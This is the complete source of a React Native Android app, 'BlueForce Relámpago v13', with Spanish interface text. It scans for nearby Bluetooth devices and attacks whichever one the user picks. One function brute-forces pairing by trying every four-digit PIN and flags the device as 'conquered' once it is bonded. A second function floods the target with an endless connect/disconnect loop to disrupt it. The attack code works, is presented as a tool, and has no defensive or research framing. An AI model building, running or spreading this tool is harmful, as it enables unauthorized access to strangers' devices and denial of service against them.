import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator, Modal, TextInput } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [history, setHistory] = useState({});
  const [aliases, setAliases] = useState({});
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('0');
  const [disruptCount, setDisruptCount] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [modalVisible, setModalVisible] = useState(false);
  const [tempName, setTempName] = useState('');
  const [renamingAddr, setRenamingAddr] = useState('');
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 50));

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE
        ]);
        addLog("🛡️ BlueForce Relámpago v13 List.");
      }
    })();
  }, []);

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    setIsScanning(true);
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
    } catch (e) { addLog("❌ Error de comunicación."); }
    finally { setIsScanning(false); }
  };

  const startBruteForce = async (device) => {
    setMode('BRUTE');
    RNBluetoothClassic.cancelDiscovery(); 
    addLog("🚀 Lanzando ráfagas de PIN...");

    for (let i = 0; i <= 9999; i++) {
        let m; setMode(c => { m = c; return c; }); if (m !== 'BRUTE') break;
        const pin = i.toString().padStart(4, '0');
        setCurrentPin(pin);
        try {
            await Promise.race([
                RNBluetoothClassic.pairDevice(device.address, { pin }),
                new Promise(r => setTimeout(r, 1200)) // Timeout para no colgarse
            ]);
            if (i % 5 === 0) {
                const bonded = await RNBluetoothClassic.getBondedDevices();
                if (bonded.some(d => d.address === device.address)) {
                    setHistory(prev => ({ ...prev, [device.address]: { status: '🔓 CONQUISTADO', pin } }));
                    setMode('IDLE'); Alert.alert("¡CONSEGUIDO!", "PIN ENCONTRADO: " + pin); return;
                }
            }
        } catch (e) {
            await new Promise(r => setTimeout(r, 400));
        }
    }
    setMode('IDLE');
  };

  const startDisruptor = async (device) => {
    setMode('DISRUPT');
    setDisruptCount(0);
    addLog("🔥 INICIANDO BOMBARDEO...");
    RNBluetoothClassic.cancelDiscovery();
    
    let count = 0;
    while (true) {
        let m; setMode(c => { m = c; return c; }); if (m !== 'DISRUPT') break;
        
        count++;
        setDisruptCount(count); // Feedback visual inmediato

        try {
            // USAMOS PROMISE.RACE PARA QUE NO SE CUELGUE SI EL PARLANTE NO RESPONDE
            await Promise.race([
                RNBluetoothClassic.connectDevice(device.address),
                new Promise(r => setTimeout(r, 800)) // Si en 800ms no conecta, pasa al siguiente ataque
            ]);
            RNBluetoothClassic.startDiscovery(); 
            await RNBluetoothClassic.disconnectDevice(device.address);
        } catch (e) {}
        
        if (count % 20 === 0) addLog(`⚡ Ráfaga #${count} impactada.`);
    }
    setMode('IDLE');
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce Relámpago v13</Text>
      
      <Modal visible={modalVisible} transparent={true} animationType="none">
        <View style={styles.modalBg}><View style={styles.modalBody}>
            <TextInput style={styles.input} value={tempName} onChangeText={setTempName} placeholder="Alias táctico..." placeholderTextColor="#666" />
            <TouchableOpacity style={styles.mBtn} onPress={() => { if(tempName) setAliases(p=>({...p,[renamingAddr]:tempName.toUpperCase()})); setModalVisible(false); }}><Text style={styles.btT}>GUARDAR</Text></TouchableOpacity>
            <TouchableOpacity onPress={()=>setModalVisible(false)}><Text style={{color:'#444', textAlign:'center', marginTop:10}}>CERRAR</Text></TouchableOpacity>
        </View></View>
      </Modal>

      <View style={[styles.panel, mode === 'DISRUPT' && { borderColor: '#ff0033', borderWidth: 2 }]}>
        <Text style={styles.st}>MODO ACTUAL: {mode}</Text>
        <Text style={styles.pinText}>{mode === 'BRUTE' ? currentPin : mode === 'DISRUPT' ? `ATKS: ${disruptCount}` : 'READY'}</Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan}>
          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.scanText}>ESCANEAR ENTORNO</Text>}
        </TouchableOpacity>
      </View>

      <FlatList data={discoveredDevices} renderItem={({ item }) => {
        const h = history[item.address] || { status: '⚪' };
        const name = aliases[item.address] || item.name || "N/A";
        const isC = h.status.includes('🔓');
        return (
          <View style={styles.card}>
            <View style={{ flex: 1, marginLeft: 10 }}>
              <Text style={styles.name}>{name}</Text>
              <Text style={styles.mac}>{item.address} | {item.rssi} dBm</Text>
              <Text style={[styles.hist, {color: isC ? '#00f2ff' : '#666'}]}>{h.status}</Text>
            </View>
            <View style={{ flexDirection: 'row' }}>
              <TouchableOpacity style={styles.btn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}><Text style={styles.btT}>PIN</Text></TouchableOpacity>
              <TouchableOpacity style={[styles.btn, {backgroundColor:'#ff0033', marginLeft:5}]} onPress={() => startDisruptor(item)} disabled={mode !== 'IDLE'}><Text style={styles.btT}>!BUG</Text></TouchableOpacity>
            </View>
          </View>
        );
      }} />
      <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.lt}>{l}</Text>)}</ScrollView>
      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={() => setMode('IDLE')}><Text style={styles.stopText}>DETENER</Text></TouchableOpacity>}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  title: { color: '#00f2ff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  panel: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 15 },
  st: { color: '#444', fontSize: 10, textAlign: 'center' },
  pinText: { color: '#fff', fontSize: 50, fontWeight: 'bold', textAlign: 'center', marginBottom: 12 },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
  scanText: { color: '#000', fontWeight: 'bold' },
  card: { backgroundColor: '#151a22', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 12 },
  mac: { color: '#444', fontSize: 8 },
  hist: { fontSize: 8, fontWeight: 'bold', marginTop: 4 },
  btn: { backgroundColor: '#222', padding: 12, borderRadius: 8 },
  btT: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  logs: { height: 90, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
  lt: { color: '#333', fontSize: 8 },
  modalBg: { flex: 1, backgroundColor: 'rgba(0,0,0,0.8)', justifyContent: 'center', alignItems: 'center' },
  modalBody: { backgroundColor: '#111', padding: 25, borderRadius: 20, width: '85%' },
  input: { backgroundColor: '#222', color: '#fff', padding: 12, borderRadius: 10 },
  mBtn: { backgroundColor: '#00f2ff', padding: 12, borderRadius: 10, marginTop: 15, alignItems: 'center' },
  stop: { backgroundColor: '#ff0033', padding: 15, borderRadius: 12, alignItems: 'center', marginTop: 10 },
  stopText: { color: '#fff', fontWeight: 'bold' }
});
